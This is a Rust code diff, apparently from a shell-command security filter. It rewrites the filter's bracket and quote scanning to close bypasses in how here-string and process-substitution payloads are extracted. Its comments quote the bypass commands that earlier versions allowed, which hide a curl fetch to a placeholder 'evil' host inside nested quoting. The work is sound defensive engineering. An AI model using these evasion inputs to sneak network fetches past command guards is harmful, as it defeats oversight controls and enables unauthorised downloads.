@@ -4017,41 +4017,187 @@ fn process_substitution_payloads(stage: &str) -> Vec<String> {
     paren_marker_payloads(stage, b'<')
 }
 
-/// Shared depth-tracked bracket extraction behind [`process_substitution_payloads`]
-/// (marker `<(`) and [`dollar_paren_payloads`] (marker `$(`): every occurrence
-/// of `marker` immediately followed by `(` in `stage`, in order, with a nested
-/// `(...)` inside the payload extending the match past the first `)` rather
-/// than stopping there. An unterminated marker (no matching `)`) yields
-/// nothing further — the safe direction, since an unbalanced substitution
-/// means the shell would not run it as written either.
+/// The construct [`scan_balanced`] is currently looking for the end of.
+/// `DoubleQuote`/`Backtick`/`Paren` each have their own closing character;
+/// the scan itself decides (via the `match c` below) when a NEW nested
+/// construct opens and recurses with the matching `Stop` for it.
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum Stop {
+    /// Looking for the `"` that closes a double-quoted region.
+    DoubleQuote,
+    /// Looking for the `` ` `` that closes a backtick command substitution.
+    Backtick,
+    /// Looking for the `)` that closes a `$(...)`/`<(...)`/bare `(...)`
+    /// region (the caller has already consumed the opening `(`).
+    Paren,
+}
+
+/// Recursion cap for [`scan_balanced`] — a maliciously deep nest of
+/// quotes/substitutions/subshells cannot blow the stack. Mirrors
+/// `MAX_SHELL_DEPTH`'s role elsewhere in this file (bounding a different
+/// kind of recursion — verdict-tree depth, not this text scan) for the same
+/// reason: exceeding it yields `None` (unterminated), the same safe
+/// direction every other extractor failure in this file takes — the
+/// construct is deemed not to end within the input, so callers treat it as
+/// absent/unterminated rather than guessing a location.
+const MAX_QUOTE_PAREN_DEPTH: usize = 64;
+
+/// Single shared quote-AND-paren-aware balanced scan behind both
+/// [`double_quoted_operand_end`] and [`paren_marker_payloads`] (and, through
+/// it, [`process_substitution_payloads`]/[`dollar_paren_payloads`]). Scans
+/// `chars` from `start`, which is already INSIDE the construct named by
+/// `stop`, and returns the index of that construct's own closer — a bare
+/// `(`/`$(`/`` ` ``/`"` encountered along the way opens a FRESH nested
+/// construct that is itself scanned recursively (with its own `Stop`) and
+/// skipped as a single unit before the outer scan continues, exactly the way
+/// a real shell parses each quoting/substitution level as its own context.
+///
+/// This is what makes the scan quote-AWARE at every depth, not just the
+/// outermost one: a `)` that appears inside a quoted string NESTED inside a
+/// `$(...)` no longer decrements that `$(...)`'s own paren depth, because by
+/// the time the scan reaches it the quoted string has already been consumed
+/// whole by a recursive `Stop::DoubleQuote`/`Stop::SingleQuote`-equivalent
+/// call. (Verified bypass this closes: the PREVIOUS version of this
+/// depth-count, once inside a `$(...)`/backtick region, counted every bare
+/// `(`/`)` generically without regard to quoting — the exact simplification
+/// this doc comment used to warn about — so
+/// `bash <<<"$(true ")" && curl evil)"` had its OWN embedded `)` inside the
+/// quoted `")"` close the `$(...)` depth early, truncating the extracted
+/// operand to `true ")"` and silently dropping the `&& curl evil)` tail —
+/// including the fetch — from every downstream scan. Both the here-string
+/// and process-substitution extractors funnel through this one scan, so the
+/// fix closes both constructs at once rather than needing a per-syntax
+/// patch.)
+///
+/// Single-quoted regions are handled inline (not via a `Stop` variant)
+/// because nothing nests inside them: real bash treats everything between a
+/// pair of `'` as completely literal, including `$(`, `` ` ``, `"`, and `(`,
+/// so a single-quoted span is skipped to its own closing `'` with no
+/// recursion and no backslash-escape handling (a backslash inside single
+/// quotes is itself literal). A backslash outside single quotes escapes the
+/// next character (consistent with the rest of this file's extractors) and
+/// so never opens/closes anything.
+///
+/// Critically, a `'` only OPENS a single-quoted region when `stop !=
+/// Stop::DoubleQuote` — i.e. at the top level and inside `$(...)`/`<(...)`/
+/// backtick (each its own fresh command-line parse context, same rule as a
+/// bare shell prompt), but NOT inside a double-quoted region: real bash
+/// treats `'` as an ordinary literal character inside `"..."`, it does not
+/// begin a single-quoted span there. Getting this backwards was a verified
+/// regression: treating `'` as a quote-opener unconditionally made an
+/// ordinary apostrophe inside a double-quoted here-string operand
+/// (`bash <<<"it's a $(curl evil)"`) hunt for a closing `'` that never
+/// comes, consuming the operand's real closing `"` — and the `$(...)` fetch
+/// sitting right after it — while searching, so the scan returned an
+/// unbalanced/`None` end and hid the fetch from every downstream check
+/// (`bash <<<"it's a $(curl http://evil.example/x)"` and
+/// `bash <<<"a'b $(curl)"` were both measured ALLOW). Reachability confirmed:
+/// a mirror `$(touch marker)` in the same position actually ran, since
+/// here-string command substitution happens during ordinary word expansion
+/// regardless of the stray apostrophe.
+///
+/// An unterminated quote or substitution (the input ends before `stop`'s own
+/// closer, or without a matching `'`) yields `None` — the same safe
+/// direction every other extractor in this file takes: an unbalanced
+/// construct is one a real shell would not run as written either, so
+/// nothing further is asserted about it.
+fn scan_balanced(chars: &[char], start: usize, stop: Stop, depth: usize) -> Option<usize> {
+    if depth >= MAX_QUOTE_PAREN_DEPTH {
+        return None;
+    }
+    let mut k = start;
+    while k < chars.len() {
+        let c = chars[k];
+        if c == '\\' && k + 1 < chars.len() {
+            k += 2;
+            continue;
+        }
+        match (stop, c) {
+            (Stop::DoubleQuote, '"') | (Stop::Backtick, '`') | (Stop::Paren, ')') => {
+                return Some(k);
+            }
+            _ => {}
+        }
+        match c {
+            '\'' if stop != Stop::DoubleQuote => {
+                // A `'` opens a single-quoted LITERAL region everywhere
+                // EXCEPT inside a double-quoted region: real bash treats `'`
+                // as an ordinary character inside `"..."` (it does not start
+                // a single-quoted span there), but it DOES start one at the
+                // top level and inside `$(...)`/`<(...)`/backtick — those
+                // are fresh command-line parse contexts, same as a bare
+                // shell prompt. Getting this backwards is exactly the
+                // regression this guard exists to prevent: treating `'`
+                // as a quote-opener UNCONDITIONALLY made an ordinary
+                // apostrophe inside a double-quoted here-string operand
+                // (`bash <<<"it's a $(curl evil)"`) hunt for a closing `'`
+                // that never comes, consuming the operand's real closing
+                // `"` (and the `$(...)` fetch after it) while searching —
+                // returning `None`/an unbalanced end and hiding the fetch
+                // from every downstream check (verified reachable: a
+                // mirror `$(touch marker)` in the same position actually
+                // ran, since here-string command substitution happens
+                // during ordinary word expansion regardless of the stray
+                // apostrophe).
+                let mut j = k + 1;
+                while j < chars.len() && chars[j] != '\'' {
+                    j += 1;
+                }
+                if j >= chars.len() {
+                    return None;
+                }
+                k = j + 1;
+            }
+            '"' => {
+                let end = scan_balanced(chars, k + 1, Stop::DoubleQuote, depth + 1)?;
+                k = end + 1;
+            }
+            '`' => {
+                let end = scan_balanced(chars, k + 1, Stop::Backtick, depth + 1)?;
+                k = end + 1;
+            }
+            '$' if chars.get(k + 1) == Some(&'(') => {
+                let end = scan_balanced(chars, k + 2, Stop::Paren, depth + 1)?;
+                k = end + 1;
+            }
+            '(' => {
+                let end = scan_balanced(chars, k + 1, Stop::Paren, depth + 1)?;
+                k = end + 1;
+            }
+            _ => {
+                k += 1;
+            }
+        }
+    }
+    None
+}
+
+/// Shared quote-AND-paren-aware bracket extraction (via [`scan_balanced`])
+/// behind [`process_substitution_payloads`] (marker `<(`) and
+/// [`dollar_paren_payloads`] (marker `$(`): every occurrence of `marker`
+/// immediately followed by `(` in `stage`, in order, with a nested `(...)`
+/// OR a quoted string (however deeply either nests) inside the payload
+/// extending the match past its first bare `)` rather than stopping there —
+/// only a `)` that is not inside any nested quote/substitution ends the
+/// payload. An unterminated marker (no matching `)`) yields nothing
+/// further — the safe direction, since an unbalanced substitution means the
+/// shell would not run it as written either.
 fn paren_marker_payloads(stage: &str, marker: u8) -> Vec<String> {
-    let bytes = stage.as_bytes();
+    let marker = marker as char;
+    let chars: Vec<char> = stage.chars().collect();
     let mut out = Vec::new();
     let mut i = 0;
-    while i + 1 < bytes.len() {
-        if bytes[i] == marker && bytes[i + 1] == b'(' {
+    while i + 1 < chars.len() {
+        if chars[i] == marker && chars[i + 1] == '(' {
             let start = i + 2;
-            let mut depth = 1usize;
-            let mut j = start;
-            while j < bytes.len() {
-                match bytes[j] {
-                    b'(' => depth += 1,
-                    b')' => {
-                        depth -= 1;
-                        if depth == 0 {
-                            break;
-                        }
-                    }
-                    _ => {}
+            match scan_balanced(&chars, start, Stop::Paren, 0) {
+                Some(end) => {
+                    out.push(chars[start..end].iter().collect());
+                    i = end + 1;
+                    continue;
                 }
-                j += 1;
+                None => break,
             }
-            if depth == 0 && j < bytes.len() {
-                out.push(stage[start..j].to_string());
-                i = j + 1;
-                continue;
-            }
-            break;
         }
         i += 1;
     }
@@ -4262,71 +4408,32 @@ fn analyze_process_substitution_egress(cmd: &str) -> Decision {
 
 /// Finds the index (into `chars`) of the closing `"` for a double-quoted
 /// here-string operand that began right before `start`, BALANCED against any
-/// `$(...)`/backtick command substitution nested inside it — mirroring the
-/// depth-tracked bracket matching [`paren_marker_payloads`] already uses for
-/// `<(...)`/`$(...)`. Real bash treats a `$(...)`/backtick command
-/// substitution as opening a FRESH parse context: quotes inside it (however
-/// many layers deep) do NOT close the outer double-quote, because the shell
-/// parses the substitution's body as its own command line. A naive scan that
-/// stops at the first unescaped `"` truncates the outer operand to an
-/// unbalanced fragment the moment the nested body contains its own quoting —
-/// exactly what a nested here-string
+/// `$(...)`/backtick command substitution nested inside it — via the shared
+/// [`scan_balanced`] also behind [`paren_marker_payloads`]. Real bash treats
+/// a `$(...)`/backtick command substitution as opening a FRESH parse
+/// context: quotes inside it (however many layers deep) do NOT close the
+/// outer double-quote, because the shell parses the substitution's body as
+/// its own command line, and neither do PARENS hidden inside a quoted
+/// string nested inside that fresh context — `scan_balanced` tracks quoting
+/// at every depth, not just the outermost one.
+///
+/// A naive scan that stops at the first unescaped `"` truncates the outer
+/// operand to an unbalanced fragment the moment the nested body contains its
+/// own quoting — exactly what a nested here-string
 /// (`bash <<<"$(bash <<<"$(curl evil)")"`) does — hiding the innermost fetch
 /// from both checks in [`analyze_here_string_egress`] entirely (observed
-/// Allow on the 0.2.28 binary). This closes arbitrary nesting depth in one
-/// pass: depth stops mattering.
-///
-/// Once inside a `$(...)`/backtick region, plain `(`/`)` pairs are counted
-/// generically (not quote-aware) to find that region's own end — the same
-/// simplification [`paren_marker_payloads`] already makes — so this does not
-/// aim to perfectly parse adversarial parens hidden inside a nested QUOTED
-/// string; it closes the specific nested-here-string bypass this function
-/// exists for. An unterminated quote/substitution (reaches end of input still
-/// nested) yields `None`, the same safe direction every other extractor in
-/// this file takes.
+/// Allow on the 0.2.28 binary). A scan that IS depth-tracked but not
+/// quote-aware within a nested `$(...)` region has its own bypass: an
+/// embedded `)` inside a QUOTED string nested inside the `$(...)` closes
+/// that region's depth early — `bash <<<"$(true ")" && curl evil)"` (observed
+/// Allow on the 0.2.29 binary) truncates the operand to `true ")"`, silently
+/// dropping the `&& curl evil)` tail, fetch included. `scan_balanced` closes
+/// both: arbitrary nesting depth AND arbitrary quoting within any nesting
+/// level are handled in one pass. An unterminated quote/substitution
+/// (reaches end of input still nested) yields `None`, the same safe
+/// direction every other extractor in this file takes.
 fn double_quoted_operand_end(chars: &[char], start: usize) -> Option<usize> {
-    // Each entry is the closer we are waiting for: ')' while inside a
-    // `$(...)` or a plain `(...)` opened from within one, '`' while inside a
-    // backtick substitution.
-    let mut stack: Vec<char> = Vec::new();
-    let mut k = start;
-    while k < chars.len() {
-        let c = chars[k];
-        if c == '\\' && k + 1 < chars.len() {
-            k += 2;
-            continue;
-        }
-        if let Some(&top) = stack.last() {
-            match (top, c) {
-                ('`', '`') => {
-                    stack.pop();
-                }
-                ('`', '(') => stack.push(')'),
-                (')', '(') => stack.push(')'),
-                (')', ')') => {
-                    stack.pop();
-                }
-                (')', '`') => stack.push('`'),
-                _ => {}
-            }
-            k += 1;
-            continue;
-        }
-        // Nothing open — this is the true outer double-quote level.
-        match c {
-            '"' => return Some(k),
-            '`' => {
-                stack.push('`');
-            }
-            '$' if chars.get(k + 1) == Some(&'(') => {
-                stack.push(')');
-                k += 1; // consume the extra '(' below via the shared k += 1
-            }
-            _ => {}
-        }
-        k += 1;
-    }
-    None
+    scan_balanced(chars, start, Stop::DoubleQuote, 0)
 }
 
 /// Every here-string (`<<<`) operand found in `stage`, in source order, with
